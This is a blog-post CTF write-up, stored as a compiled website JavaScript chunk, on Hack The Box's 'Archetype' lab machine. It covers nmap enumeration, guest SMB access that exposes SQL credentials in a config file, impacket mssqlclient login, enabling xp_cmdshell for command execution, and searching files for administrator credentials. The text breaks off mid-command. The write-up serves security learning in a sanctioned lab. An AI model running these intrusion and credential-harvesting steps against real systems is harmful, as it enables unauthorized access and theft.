"use strict";(self.webpackChunkkgkb=self.webpackChunkkgkb||[]).push([[19088],{77021:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>o,default:()=>d,frontMatter:()=>a,metadata:()=>r,toc:()=>c});var s=t(74848),i=t(28453);const a={slug:"hack-the-box-archetype-challenge",title:"Hack The Box \u2018Archetype\u2019 Challenge",description:"Fill me up!",authors:["kbbgl"],tags:["capture_the_flag","ctf","cybersecurity","hacking","smb","windows"]},o=void 0,r={permalink:"/blog/hack-the-box-archetype-challenge",source:"@site/blog/hack-the-box-archetype-challenge.md",title:"Hack The Box \u2018Archetype\u2019 Challenge",description:"Fill me up!",date:"2025-02-07T09:07:28.000Z",tags:[{inline:!1,label:"Capture_the_flag",permalink:"/blog/tags/capture-the-flag"},{inline:!1,label:"Ctf",permalink:"/blog/tags/ctf"},{inline:!1,label:"Cybersecurity",permalink:"/blog/tags/cybersecurity"},{inline:!1,label:"Hacking",permalink:"/blog/tags/hacking"},{inline:!1,label:"Smb",permalink:"/blog/tags/smb"},{inline:!1,label:"Windows",permalink:"/blog/tags/windows"}],readingTime:14.365,hasTruncateMarker:!0,authors:[{name:"Kobbi Gal",title:"I like to pick things apart and see how they work inside",url:"https://github.com/kbbgl",imageURL:"https://avatars.githubusercontent.com/u/14372649",key:"kbbgl",page:null}],frontMatter:{slug:"hack-the-box-archetype-challenge",title:"Hack The Box \u2018Archetype\u2019 Challenge",description:"Fill me up!",authors:["kbbgl"],tags:["capture_the_flag","ctf","cybersecurity","hacking","smb","windows"]},unlisted:!1,prevItem:{title:"How to Run a Sequential gulp.js Task using\xa0PowerShell",permalink:"/blog/gulpjs-task-using-powershell"},nextItem:{title:"How To Trace/Read RabbitMQ\xa0Messages",permalink:"/blog/how-to-trace-read-rabbitmq-messages"}},l={authorsImageUrls:[void 0]},c=[{value:"What is Hack The Box?",id:"what-is-hack-the-box",level:2},{value:"Connecting to Hack The Box Network",id:"connecting-to-hack-the-box-network",level:2},{value:"Enumeration",id:"enumeration",level:2},{value:"Getting Credentials using <code>smbclient</code>",id:"getting-credentials-using-smbclient",level:2},{value:"Connecting to SQL Server",id:"connecting-to-sql-server",level:2},{value:"Running System Commands from SQL Server Shell",id:"running-system-commands-from-sql-server-shell",level:2}];function h(e){const n={a:"a",blockquote:"blockquote",code:"code",h2:"h2",p:"p",pre:"pre",...(0,i.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.h2,{id:"what-is-hack-the-box",children:"What is Hack The Box?"}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.a,{href:"https://www.hackthebox.eu/",children:"Hack The Box"})," is a website offering vulnerable machines for practising hacking skills. The goal of the \u2018Labs\u2019 are to hack into the system and capture the flag (CTF) which can be found in a text file in the desktop of a regular and an administrator user.\nOn my pursuit to get some practical exercise in the field, I decided to sign up and attempt one of the beginner exercises. This post describes how I managed to get remote code execution (RCE) in the one of the boxes and access the flags."]}),"\n",(0,s.jsx)(n.h2,{id:"connecting-to-hack-the-box-network",children:"Connecting to Hack The Box Network"}),"\n",(0,s.jsxs)(n.p,{children:["The first step is to connect to the Hack The Box network to be able to enumerate the target machine. To do this, we need to download an OpenVPN configuration file (",(0,s.jsx)(n.code,{children:".ovpn"}),") and use the ",(0,s.jsx)(n.code,{children:"openvpn"})," utility to create the tunnel into the Hack The Box network:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"sudo openvpn /path/to/hack_the_box.ovpn\n \nAttempting to establish TCP connection with [AF_INET]1.222.333.222:443 [nonblock]\nTCP connection established with [AF_INET]1.222.333.222:443\n"})}),"\n",(0,s.jsx)(n.h2,{id:"enumeration",children:"Enumeration"}),"\n",(0,s.jsxs)(n.p,{children:["To enumerate a target machine (IP ",(0,s.jsx)(n.code,{children:"10.12.12.27"}),") is to list all possible ways we can use to hack into it. The best place to start is to scan the machine for open ports and try to detect the operating system so we can tailor our methods. To perform the scan, I used the standard way, ",(0,s.jsxs)(n.a,{href:"https://nmap.org/",children:[(0,s.jsx)(n.code,{children:"nmap"}),", the network mapper"]}),".\nI executed the scan as follows as I found it gives a pretty verbose output and the scan is quite fast as well:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'ip="10.12.12.27"\nnmap -T4 -A $ip -oN nmap_scan.txt\n'})}),"\n",(0,s.jsxs)(n.p,{children:["The ",(0,s.jsx)(n.code,{children:"-A"})," flag is to used to detect the operating system and version and ",(0,s.jsx)(n.code,{children:"traceroute"}),".\nThe ",(0,s.jsx)(n.code,{children:"-T4"})," flag is there to ensure that the scan is fast. The range is between ",(0,s.jsx)(n.code,{children:"0-5"})," where the higher the number, the faster it scans.\nThe ",(0,s.jsx)(n.code,{children:"-oN"})," flag tells the tool to save the scan to a file, in this case ",(0,s.jsx)(n.code,{children:"nmap_scan.txt"})," in the same directory.\nReviewing the scan output, we see that that the machine is a 2019 Windows Server  and has a SQL Server 2017 instance listening on port 1433:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"cat nmap_scan.txt\n \n...\nPORT     STATE SERVICE      VERSION                                                                                                    \n135/tcp  open  msrpc        Microsoft Windows RPC                                                                                      \n139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn                                                                              \n445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds                                                            \n1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM\n... \n"})}),"\n",(0,s.jsxs)(n.p,{children:["If we scroll down a bit more, we can see that the target machine discovery was done using the ",(0,s.jsx)(n.a,{href:"https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831795(v=ws.11)",children:"SMB (Server Message Block)"})," running on port 445 which is a protocol for shared files and folders in a network:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"cat nmap_scan.txt\n \n...\nHost script results:                                               \n...                       \n| smb-security-mode:                                               \n|   account_used: guest                                            \n|   authentication_level: user                                     \n|   challenge_response: supported                                  \n|_  message_signing: disabled (dangerous, but default)\n"})}),"\n",(0,s.jsxs)(n.p,{children:["This is the protocol that allows us to access remote shared network drives from Windows Explorer by inserting ",(0,s.jsx)(n.code,{children:"\\\\REMOTE_IP\\SHARE_NAME"})," in the address bar. SMB is known to have many vulnerabilities (e.g. ",(0,s.jsx)(n.a,{href:"https://en.wikipedia.org/wiki/EternalBlue",children:"EternalBlue"}),", ",(0,s.jsx)(n.a,{href:"https://msrc.microsoft.com/update-guide/vulnerability/ADV200005",children:"ADV200005"}),") so my intuition guided me to use this protocol to gain more information about the system. Also, we can see pretty clearly that the guest user is enabled which inherently means that there\u2019s no need for a password!"]}),"\n",(0,s.jsxs)(n.h2,{id:"getting-credentials-using-smbclient",children:["Getting Credentials using ",(0,s.jsx)(n.code,{children:"smbclient"})]}),"\n",(0,s.jsxs)(n.p,{children:["Now that we know that the SMB server is up, we need to find a way to connect and enumerate it. I found this ",(0,s.jsx)(n.a,{href:"https://unix.stackexchange.com/questions/65106/accessing-a-smb-share-without-a-password",children:"UNIX StackExchange post"})," helpful as it mentioned that we can connect to the SMB server using a client called smbclient and it provided the arguments needed to connect without a password.\nI found that I already had ",(0,s.jsx)(n.code,{children:"smbclient"})," installed:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"which smbclient\n/usr/bin/smbclient\n"})}),"\n",(0,s.jsx)(n.p,{children:"I attempted to connect to the SMB server using the following command:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'smbclient //$ip// -U " "%" "\n'})}),"\n",(0,s.jsx)(n.p,{children:"But I saw no output. It could be a positive since it means that I reached the server and no connection errors were thrown. But it seems that I was missing something to get it to display its contents.\nI turned to reading the smbclient manual and found that there\u2019s a way to list the server contents:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"man smbclient\n...\n-L|--list                                                                                                                       \n           This option allows you to look at what services are available on a server. You use it as smbclient -L host and a list should appear.\n...\n"})}),"\n",(0,s.jsx)(n.p,{children:"Sounds promising. When I ran it, I got the following output:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'smbclient -L //$ip// -U " "%" "\n                                                                                                                                       \n        Sharename       Type      Comment                                                                                              \n        ---------       ----      -------                                                                                              \n        ADMIN$          Disk      Remote Admin                                                                                         \n        backups         Disk                                                                                                           \n        C$              Disk      Default share                                                                                        \n        IPC$            IPC       Remote IPC                                                                                           \nSMB1 disabled -- no workgroup available\n'})}),"\n",(0,s.jsxs)(n.p,{children:["So we can see that we have 4 shared drives here, 3 of them are disks and one of them is used for ",(0,s.jsx)(n.a,{href:"https://en.wikipedia.org/wiki/Inter-process_communication",children:"Inter Process Communications (IPC)"}),". The IPC enables users to enumerate network shares and is created by default by the system (",(0,s.jsx)(n.a,{href:"https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/inter-process-communication-share-null-session",children:"source"}),"). So I needed to focus on trying to access the disk shares as the IPC is the share that allows us to perform the enumeration in the first place. The $ suffix in the share name indicates it\u2019s the share is hidden.\nTo access the share, I removed the ",(0,s.jsx)(n.code,{children:"-L"})," flag and ran the following command to attempt to access the ",(0,s.jsx)(n.code,{children:"ADMIN"})," share:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'smbclient //$ip//ADMIN$ -U " "%" "\ntree connect failed: NT_STATUS_ACCESS_DENIED\n'})}),"\n",(0,s.jsxs)(n.p,{children:["Same for the ",(0,s.jsx)(n.code,{children:"C$"})," share (which is the ",(0,s.jsx)(n.code,{children:"C"})," drive):"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'smbclient //$ip//C$ -U " "%" "\ntree connect failed: NT_STATUS_ACCESS_DENIED\n'})}),"\n",(0,s.jsx)(n.p,{children:"This indicates that the guest user doesn\u2019t have access to these shares. But, we attempting to access the backups share, we were introduced with a shell!"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'smbclient //$ip\\\\backups -U " "%" "                                                                                             \nTry "help" to get a list of possible commands.                                                                                         \nsmb: \\>  \n'})}),"\n",(0,s.jsx)(n.p,{children:"I typed \u2018help\u2019 in the command prompt and found that the majority of the commands were pretty standard shell commands. For instance, I wanted to list the contents of the folder:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"smb: \\> dir\n  .                                   D        0  Mon Jan 20 14:20:57 2020                                                             \n  ..                                  D        0  Mon Jan 20 14:20:57 2020                                                             \n  prod.dtsConfig                     AR      609  Mon Jan 20 14:23:02 2020                                                             \n                                                                                                                                        \n                10328063 blocks of size 4096. 8253724 blocks available \n"})}),"\n",(0,s.jsx)(n.p,{children:"I found that there\u2019s some type of configuration file named \u2018prod.dtsConfig\u2018 there. To read its contents, I used the following command:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"smb: \\> more prod.dtsConfig\n"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-markup",children:'<DTSConfiguration>                                                                                                                     \n    <DTSConfigurationHeading>                                                                                                          \n        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.201\n9 10:01:34"/>                                                                                                                          \n    </DTSConfigurationHeading>                                                                                                         \n    <Configuration ConfiguredType="Property" Path="\\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String"> \n        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Pers\nist Security Info=True;Auto Translate=False;</ConfiguredValue>                                                                         \n    </Configuration>                                                                                                                   \n</DTSConfiguration>\n'})}),"\n",(0,s.jsxs)(n.p,{children:["Looks like we got some valuable information in this XML file. We can see in the ",(0,s.jsx)(n.code,{children:"ConfiguredData"})," node that we have credentials which seem to belong to the SQL Server service:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-markup",children:"<ConfiguredValue>...;Password=M3g4c0rp123;User ID=ARCHETYPE\\sql_svc;...</ConfiguredValue>\n"})}),"\n",(0,s.jsx)(n.p,{children:"We know from the initial scan that there\u2019s an SQL Server running on the machine and we now have credentials to access it."}),"\n",(0,s.jsx)(n.h2,{id:"connecting-to-sql-server",children:"Connecting to SQL Server"}),"\n",(0,s.jsxs)(n.p,{children:["In order to start working on SQL Server, I needed a client to connect to it and execute some commands there.\nI found ",(0,s.jsx)(n.a,{href:"https://github.com/dbcli/mssql-cli",children:(0,s.jsx)(n.code,{children:"dbcli/mssql-cli"})}),". I installed it using the ",(0,s.jsx)(n.code,{children:"pip"})," Python package manager and then attempted connecting to the MSSQL service using the credentials we found earlier:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"pip3 install mssql-cli\n\nmssql-cli -S $ip -U $username -P $password\nError message: Login failed for user 'ARCHETYPE/sql_svc'.\n"})}),"\n",(0,s.jsxs)(n.p,{children:["To get some more information about the login failure, I needed to look at the logic within the ",(0,s.jsx)(n.code,{children:"mssqlcli"})," main module. I found it by searching the filesystem:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'sudo find / -wholename "*mssqlcli/main.py" 2&> /dev/null\n~/.local/lib/python3.8/site-packages/mssqlcli/main.py\n'})}),"\n",(0,s.jsxs)(n.p,{children:["I managed to find a way to increase the verbosity so I have more information about the source of the error by using the ",(0,s.jsx)(n.code,{children:"--enable-sqltoolsservice-logging"})," command line option. This revealed a ",(0,s.jsx)(n.code,{children:"NullReference"})," exception thrown from some C# logger class (which is likely a red-haring) and another exception coming from MSSQL connection service:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'mssql-cli -S $ip -U $username -P $password --enable-sqltoolsservice-logging\n \nUnhandled Exception: System.NullReferenceException: Object reference not set to an instance of an object.\n   at Microsoft.SqlTools.Utility.Logger.Close() in D:\\a\\1\\s\\src\\Microsoft.SqlTools.Hosting\\Utility\\Logger.cs:line 79\n   at Microsoft.SqlTools.ServiceLayer.Program.Main(String[] args) in D:\\a\\1\\s\\src\\Microsoft.SqlTools.ServiceLayer\\Program.cs:line 27\nTraceback (most recent call last):\n  File "~/.local/lib/python3.8/site-packages/mssqlcli/jsonrpc/contracts/request.py", line 51, in get_response\n    response = self.json_rpc_client.get_response(self.request_id, self.owner_uri)\n  File "~/.local/lib/python3.8/site-packages/mssqlcli/jsonrpc/jsonrpcclient.py", line 84, in get_response\n    raise self.exception_queue.get()\n  File "~/.local/lib/python3.8/site-packages/mssqlcli/jsonrpc/jsonrpcclient.py", line 124, in _listen_for_response\n    response = self.reader.read_response()\n  File "~/.local/lib/python3.8/site-packages/mssqlcli/jsonrpc/jsonrpcclient.py", line 272, in read_response\n    while (not self.needs_more_data or self.read_next_chunk()):\n  File "~/.local/lib/python3.8/site-packages/mssqlcli/jsonrpc/jsonrpcclient.py", line 326, in read_next_chunk\n    raise EOFError(u\'End of stream reached, no output.\')\nEOFError: End of stream reached, no output.\n \nDuring handling of the above exception, another exception occurred:\n \nTraceback (most recent call last):\n  File "/usr/lib/python3.8/runpy.py", line 194, in _run_module_as_main\n    return _run_code(code, main_globals, None,\n  File "/usr/lib/python3.8/runpy.py", line 87, in _run_code\n    exec(code, run_globals)\n  File "~/.local/lib/python3.8/site-packages/mssqlcli/main.py", line 122, in <module>\n    main()\n  File "~/.local/lib/python3.8/site-packages/mssqlcli/main.py", line 115, in main\n    run_cli_with(mssqlcli_options)\n  File "~/.local/lib/python3.8/site-packages/mssqlcli/main.py", line 52, in run_cli_with\n    mssqlcli.connect_to_database()\n  File "~/.local/lib/python3.8/site-packages/mssqlcli/mssql_cli.py", line 278, in connect_to_database\n    owner_uri, error_messages = self.mssqlcliclient_main.connect_to_database()\n  File "~/.local/lib/python3.8/site-packages/mssqlcli/mssqlcliclient.py", line 91, in connect_to_database\n    owner_uri, error_messages = self._execute_connection_request_with(connection_params)\n  File "~/.local/lib/python3.8/site-packages/mssqlcli/mssqlcliclient.py", line 180, in _execute_connection_request_with\n    response = connection_request.get_response()\n  File "~/.local/lib/python3.8/site-packages/mssqlcli/jsonrpc/contracts/request.py", line 67, in get_response\n    return self.response_error(error)\n  File "~/.local/lib/python3.8/site-packages/mssqlcli/jsonrpc/contracts/connectionservice.py", line 22, in response_error\n    u\'ownerUri\': cls.owner_uri,\nAttributeError: type object \'ConnectionRequest\' has no attribute \'owner_uri\'\n'})}),"\n",(0,s.jsxs)(n.p,{children:["I decided that I had wasted enough time debugging a third party library when there are so many other out there that do the same operation. After all, I wanted to capture the flag in an efficient as time as possible. Therefore, I decided to try ",(0,s.jsx)(n.a,{href:"https://github.com/SecureAuthCorp/impacket",children:(0,s.jsx)(n.code,{children:"impacket"})}),".\nInstallation was done using ",(0,s.jsx)(n.code,{children:"pip"}),":"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"pip install impacket\n"})}),"\n",(0,s.jsx)(n.p,{children:"And used the documentation to run the following command to connect to SQL Server but I received some unknown error which seemed to originate from switching to TLS:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"mssqlclient.py $username:$password@$ip\nImpacket v0.9.22.dev1+20200513.101403.9a4b3f52 - Copyright 2020 SecureAuth Corporation\n \nPassword:\n[*] Encryption required, switching to TLS\n[-] [('SSL routines', 'state_machine', 'internal error')]\n"})}),"\n",(0,s.jsxs)(n.p,{children:["I found that I could get more information by specifying the ",(0,s.jsx)(n.code,{children:"-debug"})," flag which provided the stacktrace:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"mssqlclient.py $username:$password@$ip -debug\nImpacket v0.9.22.dev1+20200513.101403.9a4b3f52 - Copyright 2020 SecureAuth Corporation\n \n[+] Impacket Library Installation Path: /usr/local/lib/python3.8/dist-packages/impacket-0.9.22.dev1+20200513.101403.9a4b3f52-py3.8.egg/impacket\nPassword:\n[*] Encryption required, switching to TLS\n[+] Exception:\nTraceback (most recent call last):\n  File \"/usr/local/lib/python3.8/dist-packages/impacket-0.9.22.dev1+20200513.101403.9a4b3f52-py3.8.egg/EGG-INFO/scripts/mssqlclient.py\", line 179, in <module>\n    res = ms_sql.login(options.db, username, password, domain, options.hashes, options.windows_auth)\n  File \"/usr/local/lib/python3.8/dist-packages/impacket-0.9.22.dev1+20200513.101403.9a4b3f52-py3.8.egg/impacket/tds.py\", line 917, in login\n    tls.do_handshake()\n  File \"/usr/lib/python3/dist-packages/OpenSSL/SSL.py\", line 1915, in do_handshake\n    self._raise_ssl_error(self._ssl, result)\n  File \"/usr/lib/python3/dist-packages/OpenSSL/SSL.py\", line 1647, in _raise_ssl_error\n    _raise_current_error()\n  File \"/usr/lib/python3/dist-packages/OpenSSL/_util.py\", line 54, in exception_from_error_queue\n    raise exception_type(errors)\nOpenSSL.SSL.Error: [('SSL routines', 'state_machine', 'internal error')]\n[-] [('SSL routines', 'state_machine', 'internal error')]\n"})}),"\n",(0,s.jsxs)(n.p,{children:["From the stacktrace, the issue is caused by a problem in the SSL handshake pointing to the OpenSSL library.\nDoing some research, I found that ",(0,s.jsx)(n.a,{href:"https://github.com/SecureAuthCorp/impacket/issues/856",children:"this problem"})," also happened to other people and someone had found ",(0,s.jsx)(n.a,{href:"https://github.com/SecureAuthCorp/impacket/issues/856#issuecomment-729880208",children:"a solution by modifying the TLS version from v1 to v2"}),". I performed the same changes in the ",(0,s.jsx)(n.code,{children:"~/.local/lib/python3.8/dist-packages/impacket-0.9.22.dev1+20200513.101403.9a4b3f52-py3.8.egg/impacket/tds.py"})," and reran the same command:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"mssqlclient.py $username:$password@$ip -debug\nImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation\n \n[*] Encryption required, switching to TLS\n[-] ERROR(ARCHETYPE): Line 1: Login failed for user 'sql_svc'.\n"})}),"\n",(0,s.jsxs)(n.p,{children:["This time around I got a different error message, a failed login with the user ",(0,s.jsx)(n.code,{children:"sql_svc"}),". I found a way around that by specifying the ",(0,s.jsx)(n.code,{children:"-windows-auth"})," flag which enables using ",(0,s.jsx)(n.a,{href:"https://docs.microsoft.com/en-us/sql/relational-databases/security/choose-an-authentication-mode?view=sql-server-ver15#connecting-through-windows-authentication",children:"Kerberos\\Windows authentication"}),":"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"mssqlclient.py $username:$password@$ip -windows-auth\nImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation\n \n[*] Encryption required, switching to TLS\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\n[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english\n[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192\n[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.\n[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.\n[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) \n[!] Press help for extra shell commands\nSQL> \n"})}),"\n",(0,s.jsx)(n.p,{children:"I had an SQL shell! But I was lost at this point. I had no idea what to do from here as I have very limited knowledge using SQL Server administration aside from writing queries and creating database resources. I had to take a step back to review and research this."}),"\n",(0,s.jsx)(n.h2,{id:"running-system-commands-from-sql-server-shell",children:"Running System Commands from SQL Server Shell"}),"\n",(0,s.jsxs)(n.p,{children:["Reading through official Microsoft documentation, I found that we can actually ",(0,s.jsxs)(n.a,{href:"https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15",children:["run system commands from within SQL Server using the ",(0,s.jsx)(n.code,{children:"xp_cmdshell"})]}),". This is exactly what I was looking for as it enabled me to be able to interact with the remote target system. When I attempted to run this cmdlet, I received the following error:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"SQL> xp_cmdshell \"echo test\"\n \n[-] ERROR(ARCHETYPE): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.\n"})}),"\n",(0,s.jsxs)(n.p,{children:["Seems that we need to enable the use of the command somehow. Reading the ",(0,s.jsx)(n.a,{href:"https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15#remarks",children:"Microsoft documentation"})," in greater depth, I found that the cmdlet is disabled by default. It also gave me the information I needed in order to enable it:"]}),"\n",(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.code,{children:"xp_cmdshell"})," is a very powerful feature and disabled by default. ",(0,s.jsx)(n.code,{children:"xp_cmdshell"})," can be enabled and disabled by using the Policy-Based Management or by executing ",(0,s.jsx)(n.code,{children:"sp_configure"}),". For more information, see ",(0,s.jsx)(n.a,{href:"https://docs.microsoft.com/en-us/sql/relational-databases/security/surface-area-configuration?view=sql-server-ver15",children:"Surface Area Configuration"})," and ",(0,s.jsxs)(n.a,{href:"https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-ver15",children:[(0,s.jsx)(n.code,{children:"xp_cmdshell"})," Server Configuration Option"]}),"."]}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:"I ran the following command to enable it:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"sp_configure 'xp_cmdshell', 1\n[*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.\n"})}),"\n",(0,s.jsxs)(n.p,{children:["I then ran ",(0,s.jsx)(n.code,{children:"reconfigure"})," as requested. I was now able to run any commands on the machine.\nSince I speak a little bit of Batch, I ran a command to see which directory we\u2019re currently in:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'SQL> xp_cmdshell "echo The current directory is %CD%"\noutput                                                                             \n \n--------------------------------------------------------------------------------   \n \nThe current directory is C:\\Windows\\system32                                       \nSQL>whoami\noutput                                                                             \n \n--------------------------------------------------------------------------------   \n \narchetype\\sql_svc \n'})}),"\n",(0,s.jsxs)(n.p,{children:["Looks like the user we\u2019re currently logged in with ",(0,s.jsx)(n.code,{children:"sql_svc"})," who can run remote commands on the system. So now all that is left is to read the contents of the user flag in the desktop:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'SQL> xp_cmdshell "type c:\\Users\\sql_svc\\Desktop\\user.txt"\noutput                                                                             \n \n--------------------------------------------------------------------------------   \n \n3e7b102e78218e935bf3f4951fec21a3\n'})}),"\n",(0,s.jsx)(n.p,{children:"I was delighted at this point. But still had my eyes to the second and more challenging part: retrieve the administrator\u2019s flag.\nI attempted to access the path where the flag is located but unfortunately I could not access it:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'SQL> xp_cmdshell "cd c:\\Users\\Administrator\\Desktop"\noutput                                                                             \n \n--------------------------------------------------------------------------------   \nAccess is denied.\n'})}),"\n",(0,s.jsx)(n.p,{children:"I decided, since I had access to the C: drive, it was worth to do a recursive search in the drive to see if we can find the word \u201cadministrator\u201d in some file (since we know that only the administrator account can access the flag on its desktop):\nI spawned a new PowerShell process and ran the following command only to be stopped because of denial to search in a particular path (The Event Viewer logs):"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-powershell",children:'SQL>xp_cmdshell "powershell "Get-ChildItem -Recurse | Select-String administrator -List | Select Path""\n \nSelect-String : The file C:\\Windows\\system32\\winevt\\Logs\\Windows PowerShell.evtx cannot be read: Access to the path    \n \n\'C:\\Windows\\system32\\winevt\\Logs\\Windows PowerShell.evtx\' is denied.               \n \nAt line:1 char:26                                                                  \n \n+ Get-ChildItem -Recurse | Select-String administrator -List | Select P ...        \n \n+                          ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                       \n \n    + CategoryInfo          : InvalidArgument: (:) [Select-String], ArgumentException   \n \n    + FullyQualifiedErrorId : ProcessingFile,Microsoft.PowerShell.Commands.SelectStringCommand   \n'})}),"\n",(0,s.jsxs)(n.p,{children:["I altered the command a bit and added the flag ",(0,s.jsx)(n.code,{children:"-ErrorAction SilentlyContinue"})," to prevent the script from from stopping. Let me break down each part to explain what it\u2019s intended to do.\nThe first part retrieves all files and directories from the ",(0,s.jsx)(n.code,{children:"sql_svc"})," home folder recursively. ",(0,s.jsxs)(n.a,{href:"https://superuser.com/questions/150748/have-powershell-get-childitem-return-files-only",children:["The ",(0,s.jsx)(n.code,{children:"-File"})," flag ensures the cmdlet only returns files. The ",(0,s.jsx)(n.code,{children:"-Force"})," flag is important here because it searches for all files (even hidden ones)"]}),":"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-powershell",children:"Get-ChildItem -Path C:\\Users\\sql_svc -Recurse -Force -ErrorAction SilentlyContinue -File\n"})}),"\n",(0,s.jsx)(n.p,{children:"We then pipe the list of all files and folders into the following command:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-powershell",children:"Get-Content -ErrorAction SilentlyContinue\n"})}),"\n",(0,s.jsx)(n.p,{children:"This will read the contents of each file that was piped into the command and print it to the console.\nThe last part of the command performs a case-insensitive search for the word \u2018administrator\u2019 in all the piped content:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-powershell",children:"Select-String administrator -ErrorAction SilentlyContinue\n"})}),"\n",(0,s.jsx)(n.p,{children:"Putting it all together and displaying the output, we see that one of the files that was read had a command that included the word \u2018administrator\u2019!"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-powershell",children:'SQL> xp_cmdshell "powershell "Get-ChildItem -Path C:\\Users\\sql_svc -Recurse -Force -ErrorAction SilentlyContinue | Get-Content -ErrorAction SilentlyContinue| Select-String administrator -ErrorAction SilentlyContinue""\n \noutput                                                                             \n \n--------------------------------------------------------------------------------   \nnet.exe use T: \\\\Archetype\\backups /user:administrator MEGACORP_4dm1n!!            \n'})}),"\n",(0,s.jsxs)(n.p,{children:["The command ",(0,s.jsx)(n.a,{href:"https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/gg651155(v=ws.11)",children:"maps the T drive to the backups share using the administrator account"}),". And we can see that the last argument includes the administrator password!\nAll that\u2019s left is to either log in with the administrator credentials to SQL Server or find a way to run a command as the administrator and then read the contents of the flag.\nThe attempt for the former failed:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"mssqlclient.py ARCHETYPE/administrator:MEGACORP_4dm1n\\!\\!@$ip -windows-auth\nImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation\n \n[*] Encryption required, switching to 